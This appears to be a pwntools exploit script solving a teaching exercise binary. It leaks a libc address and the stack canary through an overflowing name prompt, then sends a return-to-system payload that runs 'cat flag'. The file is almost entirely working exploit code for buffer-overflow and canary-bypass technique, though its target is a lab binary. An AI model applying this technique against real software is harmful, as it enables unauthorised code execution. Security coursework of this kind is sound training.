#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *check_authorization+36
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def get_address(r):
    r.sendline(b"A" * 135)
    r.recvuntil(b"Well of course ")

    string = r.recvuntil(b" is not the password")
    string = string.replace(b"A", b"").replace(b" is not the password", b"").strip(b"\n")

    # function in stack is fgets+154
    fgets_addr = u64(string[0:] + b"\00" * (8 - len(string[0:]))) - 154

    # from debugging get absolute offset between fgets and system
    system_address = fgets_addr - 0x303a0

    return system_address


def get_canary(r):
    r.recvline()
    r.sendline(b"A" * 183)

    # get rid of dummy strings
    r.recvuntil(b"Well of course ")

    # trim the string containing the canary
    string = r.recvuntil(b"is not the password")
    string = string.replace(b"A", b"").replace(b" is not the password", b"").strip(b"\n")

    # first 4 bytes are the canary
    canary = u32(string[0:4])

    return p32(canary)


r = start()
r.recvline()

# write cat flag on the stack to access it later using system
r.sendline(b"cat flag")
# by looking on ghidra where "name" is stored

# get system address
system_address = p64(get_address(r))

# issue a return to correct stack misalignment
ret_address = p64(0x40133c)

# get canary as in previous exploits
canary = get_canary(r)

r.sendline(b"A" * 184 + canary + b"A" * 12 + ret_address + system_address)
r.recvuntil(b"is not the password")

print(r.recvall(timeout=2))
